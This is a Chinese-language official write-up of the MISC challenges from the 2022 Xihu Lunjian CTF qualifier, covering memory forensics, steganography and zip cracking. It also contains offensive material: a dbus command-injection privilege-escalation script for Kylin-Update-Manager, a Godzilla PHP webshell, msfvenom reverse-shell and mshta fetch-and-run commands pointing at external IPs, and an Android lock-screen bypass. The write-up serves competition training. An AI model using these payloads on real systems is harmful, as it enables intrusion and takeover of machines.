# MISC｜西湖论剑·2022中国杭州网络安全技能大赛初赛官方Write Up

> 原文: https://www.ctfiot.com/96709.html
> ID: 96709

2023年2月2日，第六届西湖论剑网络安全技能大赛初赛落下帷幕！来自全国306所高校、485支战队、2733人集结线上初赛！

以下为本届西湖论剑大赛初赛MISC题目的Write Up

MISC

2022西湖论剑大赛官方WP

（一）

Isolated Machine Memory Analysis

1、使用volatility对题目附件进行常规的基本分析，可以得知系统上运行有mstsc.exe进程，即题目提及的远程连接，需要设法获取远程服务器有关信息；

2、注意到题目附件为ELF core dump格式，资料查阅可知VirtualBox生成的虚拟机ELF core dump包含VRAM等额外信息1；

3、从题目附件提取VRAM内容，还原为图像（观察数据可知4字节为一单位，从数据长度粗略估计分辨率），可以得到虚拟机桌面，其上有远程连接窗口。其中的Python IDLE窗口展示了加密flag的方式（类似RSA）及数值，聊天窗口提示加密公钥可能从聊天窗口复制得到；

4、使用volatility检查题目附件的剪切板内容，可以得到加密公钥；

5、检查公钥参数可以发现其公开模数N较短（512位）且可使用factordb查询得到私钥参数P与Q2；

6、注意到指数E为2，与RSA不符但符合Rabin密码特征。编写Rabin解密脚本，代入P、Q与加密flag，解密得到的四条明文中包含flag。

（二）

机你太美

1、首先看见是npbk文件，用可知夜神模拟器的设备，导入

2、导入后开机，发现有密码，使用adbshell连接，执行rm /data/system/locksettings.db ，随后重启，即可绕过开机密码

3、简单看了眼相册，并没什么有用的，发现一个Skred聊天工具，比较可疑，打开看看

5、结尾说明两张图片有用，猜测藏了一些隐写信息

6、第二张图片通过使用在线exif发现了隐藏信息

7、暂时不知道有什么用，看看另一张，通过010发现本质是个png，尝试用stegsolve进行查看

8、在a2通道发现异样

9、写脚本提取

from PIL import Image

img = Image.open('1.png')
a, b = img.size
flag = ''
for x in range(a):
    for y in range(b):
        pixel = img.getpixel((x, y))
        if x == 400:
            r, g, b, alpha = pixel
            if alpha == 251:
                flag += '0'
            elif alpha == 255:
                flag += '1'
            

print(flag)

10、然后获得内容cyberchef转一下，获得了一串key

11、通过聊天记录可知他最后补发了一份，那么尝试用该串解密他补发的内容

12、内容乱码，结合之前获得的XOR信息，异或一下即可获得flag

（三）

KP-Basic

1、打开是这样一个界面，可以对指定的 IP 地址发起 ping。

2、抓取请求，注入命令，反弹 Shell。

3、尝试执行自定义脚本，未果，推测有拦截。

4、则尝试用 dbus 提权，审计 Kylin-Update-Manager 的源码，可以发现这个漏洞https://www.cnvd.org.cn/flaw/show/CNVD-2022-78421 还没修。

5、接下来就可以 su fakeadmin, 然后就可以用 Bb123*** 这个密码登录，然后就可以sudo su 提权到root。

6、然后接下来切换到 glzjin 用户，启动 vncserver。

7、然后开启文件保险箱，初始化失败。

8、需要想办法把vncserver的父进程id挂到当前系统登录的session里，可以用快捷方式+开机启动项操作。

9、重启，再连接，即可打开文件保险箱。

10、使用rockyou.txt 密码尝试，尝试到大概三百个左右时 “maganda” 这个密码可行，打开即可看到flag。

（四）

mp3

1、下载附件得到一个mp3文件，播放一下没有什么特殊声音。先用winhex打开，发现文件尾后面藏了一个png图片

2、先将png图片提取出来，得到：

3、图片比较规整，只有0和255两种颜色，怀疑图片的黑色和白色转0和1，写一个脚本跑一下，发现是压缩包，提取脚本如下：

from PIL import Image
import struct

pic = Image.open('cipher.png')
a, b = pic.size

fp = open('flag.zip', 'wb')
flag = ''
for y in range(b):
    for x in range(a):
        flag += str(pic.getpixel((x, y))//255)

for i in range(0, len(flag), 8):
    fp.write(struct.pack('B', int(flag[i:i+8], 2)))
fp.close()

跑一下脚本得到一个加密的压缩包文件

4、此时缺一个压缩包的password，附件是一个mp3文件，但此时还没有用到mp3相关的隐写，尝试一下，最后可以发现是mp3stego，该隐写方式需要密码，但我们在解题过程中并没有获得过密码，尝试空密码解密，发现解密成功

5、解密成功后得到：

8750d5109208213f

尝试解密压缩包，解密成功，得到47.txt

2lO,.j2lL000iZZ2[2222iWP,.ZQQX,2.[002iZZ2[2020iWP,.ZQQX,2.[020iZZ2[2022iWLNZQQX,2.[2202iW2,2.ZQQX,2.[022iZZ2[2220iWPQQZQQX,2.[200iZZ2[202iZZ2[2200iWLNZQQX,2.[220iZZ2[222iZZ2[2000iZZ2[2002iZZ2Nj2]20lW2]20l2ZQQX,2]202.ZW2]02l2]20,2]002.XZW2]22lW2]2ZQQX,2]002.XZWWP2XZQQX,2]022.ZW2]00l2]20,2]220.XZW2]2lWPQQZQQX,2]002.XZW2]0lWPQQZQQX,2]020.XZ2]20,2]202.Z2]00Z2]02Z2]2j2]22l2]2ZWPQQZQQX,2]022.Z2]00Z2]0Z2]2Z2]22j2]2lW2]000X,2]20.,2]20.j2]2W2]2W2]22ZQ-QQZ2]2020ZWP,.ZQQX,2]020.Z2]2220ZQ--QZ2]002Z2]220Z2]020Z2]00ZQW---Q--QZ2]002Z2]000Z2]200ZQ--QZ2]002Z2]000Z2]002ZQ--QZ2]002Z2]020Z2]022ZQ--QZ2]002Z2]000Z2]022ZQ--QZ2]002Z2]020Z2]200ZQ--QZ2]002Z2]000Z2]220ZQLQZ2]2222Z2]2000Z2]000Z2]2002Z2]222Z2]020Z2]202Z2]222Z2]2202Z2]220Z2]2002Z2]2002Z2]2202Z2]222Z2]2222Z2]2202Z2]2022Z2]2020Z2]222Z2]2220Z2]2002Z2]222Z2]2020Z2]002Z2]202Z2]2200Z2]200Z2]2222Z2]2002Z2]200Z2]2022Z2]200ZQN---Q--QZ2]200Z2]000ZQXjQZQ-QQXWXXWXj

6、根据标题47.txt，怀疑是rot47，尝试解密，得到：

a=~[];a={___:++a,aaaa:(![]+"")[a],__a:++a,a_a_:(![]+"")[a],_a_:++a,a_aa:({}+"")[a],aa_a:(a[a]+"")[a],_aa:++a,aaa_:(!""+"")[a],a__:++a,a_a:++a,aa__:({}+"")[a],aa_:++a,aaa:++a,a___:++a,a__a:++a};a.a_=(a.a_=a+"")[a.a_a]+(a._a=a.a_[a.__a])+(a.aa=(a.a+"")[a.__a])+((!a)+"")[a._aa]+(a.__=a.a_[a.aa_])+(a.a=(!""+"")[a.__a])+(a._=(!""+"")[a._a_])+a.a_[a.a_a]+a.__+a._a+a.a;a.aa=a.a+(!""+"")[a._aa]+a.__+a._+a.a+a.aa;a.a=(a.___)[a.a_][a.a_];a.a(a.a(a.aa+"""+a.a_a_+(![]+"")[a._a_]+a.aaa_+"\"+a.__a+a.aa_+a._a_+a.__+"(\"\"+a.__a+a.___+a.a__+"\"+a.__a+a.___+a.__a+"\"+a.__a+a._a_+a._aa+"\"+a.__a+a.___+a._aa+"\"+a.__a+a._a_+a.a__+"\"+a.__a+a.___+a.aa_+"{"+a.aaaa+a.a___+a.___+a.a__a+a.aaa+a._a_+a.a_a+a.aaa+a.aa_a+a.aa_+a.a__a+a.a__a+a.aa_a+a.aaa+a.aaaa+a.aa_a+a.a_aa+a.a_a_+a.aaa+a.aaa_+a.a__a+a.aaa+a.a_a_+a.__a+a.a_a+a.aa__+a.a__+a.aaaa+a.a__a+a.a__+a.a_aa+a.a__+"}\"\"+a.a__+a.___+");"+""")())();

该形式非常类似jjencode，但是jjencode多为$，而这里是大量的a。但实则没有区别，只是换了一个字符而已。直接放到浏览器控制台内运行，即可得到flag：

DASCTF{f8097257d699d7fdba7e97a15c4f94b4}

（五）

take_the_zip_easy

首先拿到附件为 zipeasy.zip，压缩包里面有俩文件，一个 dasflow.pcapng，一个是 dasflow.zip，猜测 dasflow.zip 就是 dasflow.pcapng 被压缩后的压缩包。那么 dasflow.zip 这个压缩包中偏移固定 30 字节的位置处必定是 dasflow.pcapng。

而当一个加密压缩包中存在另一个 zip 压缩包时，我们又猜测出了该压缩包内的文件名称时，就可以尝试使用已知明文攻击。

看一下加密方式，dasflow.zip 是 ZipCrypto Store 加密的，正好符合。

尝试攻击：

md5sum zipeasy.zip
echo -n "dasflow.pcapng" | hex
time ./bkcrack -C zipeasy.zip -c dasflow.zip -x 30 646173666c6f772e706361706e67 -x 0 504B0304 > 1.log &
tail -f 1.log

image-20221106202354479

得到的 3 个 key 为：

2b7d78f3 0ebcabad a069728c

提取出 dasflow.zip：

./bkcrack -C zipeasy.zip -c dasflow.zip -k 2b7d78f3 0ebcabad a069728c -d dasflow.zip

当然也可直接借助 ARCHPR 的“口令来自密钥”功能进行恢复得到解密后的流量包

追踪一下 POST 数据流，发现上传了 eval.php 文件，很明显的 Godzilla 特征：

代码如下：

<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
$pass='air123';
$payloadName='payload';
$key='d8ea7326e6ec5916';
if (isset($_POST[$pass])){
    $data=encode(base64_decode($_POST[$pass]),$key);
    if (isset($_SESSION[$payloadName])){
        $payload=encode($_SESSION[$payloadName],$key);
        if (strpos($payload,"getBasicsInfo")===false){
            $payload=encode($payload,$key);
        }
  eval($payload);
        echo substr(md5($pass.$key),0,16);
        echo base64_encode(encode(@run($data),$key));
        echo substr(md5($pass.$key),16);
    }else{
        if (strpos($data,"getBasicsInfo")!==false){
            $_SESSION[$payloadName]=encode($data,$key);
        }
    }
}

由于后续所有的流量都经过了该 webshell 进行混淆，所以需要进行解密：

<?php
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
// $pass='air123';
$key='d8ea7326e6ec5916';

$a = 'ca19adef3b7a8ce7J+5pNzMyNmU2Zkj4dYADUu5NThjkf39Jf7E3ff4hHq4XSElxItE0ZQOqa0EPMTZkb2e56eb02f8c2a4d';
$b = substr($a, 16, strlen($a)-32);
echo gzdecode(encode(base64_decode($b), $key));
// uid=33(www-data) gid=33(www-data) groups=33(www-data)

由于需要解密的流量太多，这里通过 文件->导出对象->HTTP 导出所有文件：

发现 flag.zip，发现需要密码，猜测隐藏在其他响应包内容里，这里批量进行解密：

from urllib.parse import unquote
import gzip, base64, re
def encode(D, K):
    res = b''
    for i in range(len(D)):
        c = K[i+1&15]
        res += bytes.fromhex(hex(D[i]^ord(c))[2:].zfill(2))
    return res

# pass='air123'
key='d8ea7326e6ec5916'

for i in range(1,28):
    with open(f'aaa/eval({i}).php', 'r') as f:
        data = unquote(f.read())
        if 'air123' in data:
            try:
                data = re.findall(r'air123=(.*)', data)[0]
                print(f'eval({i}).php - request:')
                print(gzip.decompress(encode(base64.b64decode(data.encode()), key)))
            
except:
                pass
        # else:
        #     try:
        #         data = data[16:-16]
        #         print(f'eval({i}).php - request:')
        #         print(gzip.decompress(encode(base64.b64decode(data.encode()), key)))
        #     
except:
        #         pass

通过批量解密拿到密码 airDAS1231qaSW@，解压之前从流量包中提取出来的 flag.zip 拿到最终 flag。

（六）

TryToExec

1、打开靶机，是这样一个界面，可以执行 ping 和 tracert。

3、推测后端为 os.subprocess([action, ‘www.zhaoj.in’])，可执行文件名可控，结合其为 Windows，可以尝试用 UNC 路径进行攻击。

4、先生成下 MSF 马。

— 往期回顾 —

2023年首期CSE班开课啦！云安全工程师CISP-CSE火热招生中～新春优惠，欢迎报名咨询！

2022-01-16

安恒培训｜2023年1月&2月认证培训计划来袭！火热报名中～

2022-01-05

安恒信息与滨江区浙工大网安院共建“网络安全创新共享实训基地”

2022-01-04


```
#!/usr/bin/env python3

import io

# pip install Pillow
from PIL import Image

# $ volatility vboxinfo
# ...
# FileOffset       Memory Offset    Size
#              ...              ...        ...
#       0xdffcda2c       0xe0000000  0x2000000
#              ...              ...        ...

# Bit-depth & resolution needs some observation on extracted data and make educated guesses.
# Alternatively, resolution can be found by Screenshot plugin

img = Image.new('RGB', (1440, 900))
img_data = img.load()
with open('CharlieBrown-PC.elf', 'rb') as f:
 f.seek(0xdffcda2c, io.SEEK_SET)
 for y in range(900):
  for x in range(1440):
   data = list(f.read(4)[ : 3]) # BGRx
   data[0], data[2] = data[2], data[0]
   img_data[x, y] = tuple(data)

img.save('screen.png')
#!/usr/bin/env python3

# pip install pycryptodome
from Crypto.Util.number import bytes_to_long, long_to_bytes

# Extended Euclid Algorithm, eqv. to gmpy2.gcdext()
def gcdext(a: int, b: int) -> tuple[int, int, int]:
 x0, x1 = 1, 0
 y0, y1 = 0, 1
 
 while b > 0:
  q = a // b
  a, b = b, a % b
  
  x0, x1 = x1, x0 - x1 * q
  y0, y1 = y1, y0 - y1 * q
 
 return a, x0, y0

# From the public key extracted from the clipboard
n = 6761456110411637567688581808417563265129495172728559363264959694161676396727177452588827048488546653264235848263182009106217734439508352645687684489830161

# Via factordb
p = 79346858353882639199177956883793426898254263343390015030885061293456810296567
q = 85213910804835068776008762162103815863113854646656693711835550035527059235383

# From VRAM screenshot
c = bytes_to_long(bytes.fromhex('089ebf3622f6f6d498c1b5ecfe4d831d3e876bf55578586389127e0053bb4fe006e2eee5398b86274fdce0418d16c9bb0bf24922cec491b3047d33eb661784c9'))

mp = pow(c, (p + 1) // 4, p)
mq = pow(c, (q + 1) // 4, q)
_, yp, yq = gcdext(p, q)
m1 = (yp * p * mq + yq * q * mp) % n
m2 = n - m1
m3 = (yp * p * mq - yq * q * mp) % n
m4 = n - m3

print('flag1t=', long_to_bytes(m1))
print('flag2t=', long_to_bytes(m2))
print('flag3t=', long_to_bytes(m3))
print('flag4t=', long_to_bytes(m4))
from PIL import Image

img = Image.open('1.png')
a, b = img.size
flag = ''
for x in range(a):
    for y in range(b):
        pixel = img.getpixel((x, y))
        if x == 400:
            r, g, b, alpha = pixel
            if alpha == 251:
                flag += '0'
            elif alpha == 255:
                flag += '1'
            

print(flag)
from pathlib import Path

import dbus
import base64
from pathlib import Path

command = "adduser fakeadmin && adduser fakeadmin sudo && echo 'fakeadmin:
Bb123***'|chpasswd"
command_base64 = base64.b64encode(command.encode()).decode()
path = '/tmp/`echo ' + command_base64 + '|base64 -d|sh`'
Path(path).touch()

bus = dbus.SystemBus()
remote_object = bus.get_object("cn.kylinos.KylinUpdateManager", "/cn/kylinos/KylinUpdateManager")
remote_object.install_snap(path, dbus_interface="cn.kylinos.KylinUpdateManager")
print("Command executed!")
from PIL import Image
import struct

pic = Image.open('cipher.png')
a, b = pic.size

fp = open('flag.zip', 'wb')
flag = ''
for y in range(b):
    for x in range(a):
        flag += str(pic.getpixel((x, y))//255)

for i in range(0, len(flag), 8):
    fp.write(struct.pack('B', int(flag[i:i+8], 2)))
fp.close()
8750d5109208213f
2lO,.j2lL000iZZ2[2222iWP,.ZQQX,2.[002iZZ2[2020iWP,.ZQQX,2.[020iZZ2[2022iWLNZQQX,2.[2202iW2,2.ZQQX,2.[022iZZ2[2220iWPQQZQQX,2.[200iZZ2[202iZZ2[2200iWLNZQQX,2.[220iZZ2[222iZZ2[2000iZZ2[2002iZZ2Nj2]20lW2]20l2ZQQX,2]202.ZW2]02l2]20,2]002.XZW2]22lW2]2ZQQX,2]002.XZWWP2XZQQX,2]022.ZW2]00l2]20,2]220.XZW2]2lWPQQZQQX,2]002.XZW2]0lWPQQZQQX,2]020.XZ2]20,2]202.Z2]00Z2]02Z2]2j2]22l2]2ZWPQQZQQX,2]022.Z2]00Z2]0Z2]2Z2]22j2]2lW2]000X,2]20.,2]20.j2]2W2]2W2]22ZQ-QQZ2]2020ZWP,.ZQQX,2]020.Z2]2220ZQ--QZ2]002Z2]220Z2]020Z2]00ZQW---Q--QZ2]002Z2]000Z2]200ZQ--QZ2]002Z2]000Z2]002ZQ--QZ2]002Z2]020Z2]022ZQ--QZ2]002Z2]000Z2]022ZQ--QZ2]002Z2]020Z2]200ZQ--QZ2]002Z2]000Z2]220ZQLQZ2]2222Z2]2000Z2]000Z2]2002Z2]222Z2]020Z2]202Z2]222Z2]2202Z2]220Z2]2002Z2]2002Z2]2202Z2]222Z2]2222Z2]2202Z2]2022Z2]2020Z2]222Z2]2220Z2]2002Z2]222Z2]2020Z2]002Z2]202Z2]2200Z2]200Z2]2222Z2]2002Z2]200Z2]2022Z2]200ZQN---Q--QZ2]200Z2]000ZQXjQZQ-QQXWXXWXj
a=~[];a={___:++a,aaaa:(![]+"")[a],__a:++a,a_a_:(![]+"")[a],_a_:++a,a_aa:({}+"")[a],aa_a:(a[a]+"")[a],_aa:++a,aaa_:(!""+"")[a],a__:++a,a_a:++a,aa__:({}+"")[a],aa_:++a,aaa:++a,a___:++a,a__a:++a};a.a_=(a.a_=a+"")[a.a_a]+(a._a=a.a_[a.__a])+(a.aa=(a.a+"")[a.__a])+((!a)+"")[a._aa]+(a.__=a.a_[a.aa_])+(a.a=(!""+"")[a.__a])+(a._=(!""+"")[a._a_])+a.a_[a.a_a]+a.__+a._a+a.a;a.aa=a.a+(!""+"")[a._aa]+a.__+a._+a.a+a.aa;a.a=(a.___)[a.a_][a.a_];a.a(a.a(a.aa+"""+a.a_a_+(![]+"")[a._a_]+a.aaa_+"\"+a.__a+a.aa_+a._a_+a.__+"(\"\"+a.__a+a.___+a.a__+"\"+a.__a+a.___+a.__a+"\"+a.__a+a._a_+a._aa+"\"+a.__a+a.___+a._aa+"\"+a.__a+a._a_+a.a__+"\"+a.__a+a.___+a.aa_+"{"+a.aaaa+a.a___+a.___+a.a__a+a.aaa+a._a_+a.a_a+a.aaa+a.aa_a+a.aa_+a.a__a+a.a__a+a.aa_a+a.aaa+a.aaaa+a.aa_a+a.a_aa+a.a_a_+a.aaa+a.aaa_+a.a__a+a.aaa+a.a_a_+a.__a+a.a_a+a.aa__+a.a__+a.aaaa+a.a__a+a.a__+a.a_aa+a.a__+"}\"\"+a.a__+a.___+");"+""")())();
md5sum zipeasy.zip
echo -n "dasflow.pcapng" | hex
time ./bkcrack -C zipeasy.zip -c dasflow.zip -x 30 646173666c6f772e706361706e67 -x 0 504B0304 > 1.log &
tail -f 1.log
2b7d78f3 0ebcabad a069728c
./bkcrack -C zipeasy.zip -c dasflow.zip -k 2b7d78f3 0ebcabad a069728c -d dasflow.zip
<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
$pass='air123';
$payloadName='payload';
$key='d8ea7326e6ec5916';
if (isset($_POST[$pass])){
    $data=encode(base64_decode($_POST[$pass]),$key);
    if (isset($_SESSION[$payloadName])){
        $payload=encode($_SESSION[$payloadName],$key);
        if (strpos($payload,"getBasicsInfo")===false){
            $payload=encode($payload,$key);
        }
  eval($payload);
        echo substr(md5($pass.$key),0,16);
        echo base64_encode(encode(@run($data),$key));
        echo substr(md5($pass.$key),16);
    }else{
        if (strpos($data,"getBasicsInfo")!==false){
            $_SESSION[$payloadName]=encode($data,$key);
        }
    }
}
<?php
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
// $pass='air123';
$key='d8ea7326e6ec5916';

$a = 'ca19adef3b7a8ce7J+5pNzMyNmU2Zkj4dYADUu5NThjkf39Jf7E3ff4hHq4XSElxItE0ZQOqa0EPMTZkb2e56eb02f8c2a4d';
$b = substr($a, 16, strlen($a)-32);
echo gzdecode(encode(base64_decode($b), $key));
// uid=33(www-data) gid=33(www-data) groups=33(www-data)
from urllib.parse import unquote
import gzip, base64, re
def encode(D, K):
    res = b''
    for i in range(len(D)):
        c = K[i+1&15]
        res += bytes.fromhex(hex(D[i]^ord(c))[2:].zfill(2))
    return res

# pass='air123'
key='d8ea7326e6ec5916'

for i in range(1,28):
    with open(f'aaa/eval({i}).php', 'r') as f:
        data = unquote(f.read())
        if 'air123' in data:
            try:
                data = re.findall(r'air123=(.*)', data)[0]
                print(f'eval({i}).php - request:')
                print(gzip.decompress(encode(base64.b64decode(data.encode()), key)))
            
except:
                pass
        # else:
        #     try:
        #         data = data[16:-16]
        #         print(f'eval({i}).php - request:')
        #         print(gzip.decompress(encode(base64.b64decode(data.encode()), key)))
        #     
except:
        #         pass
docker run -it -p 139:
139 -p 445:
445 -v /tmp:/share -d dperson/samba -s "public;/share"
curl http://162.14.79.59:
9988
chmod 777 1.bat
nc -lvnvp 9988
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=162.14.121.186 LPORT=4444 -f hta-psh > shell.hta
python3 -m http.server 9866
mshta http://162.14.121.186:
9866/shell.hta
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/7-1675934406.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/8-1675934407.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/7-1675934407.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/7-1675934407.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/0-1675934408.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/0-1675934410.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/6-1675934413.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/5-1675934413.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/1-1675934413.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/5-1675934414.png)